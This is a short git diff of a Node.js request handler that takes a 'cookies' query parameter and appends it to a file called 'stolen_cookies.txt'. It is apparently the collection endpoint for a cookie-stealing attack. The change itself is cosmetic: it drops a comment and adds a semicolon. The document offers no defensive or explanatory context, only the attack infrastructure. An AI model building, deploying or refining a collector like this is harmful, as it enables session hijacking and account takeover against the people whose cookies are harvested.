@@ -6,7 +6,6 @@ module.exports = (req, res) => {
         const cookies = req.query.cookies || 'No cookies';
         const logFile = path.join(__dirname, 'stolen_cookies.txt');
 
-        // Append the cookies to the log file
         fs.appendFile(logFile, `${cookies}\n`, (err) => {
             if (err) {
                 console.error('Error writing to file', err);
@@ -18,4 +17,4 @@ module.exports = (req, res) => {
     } else {
         res.status(405).send('Method Not Allowed');
     }
-}
+};
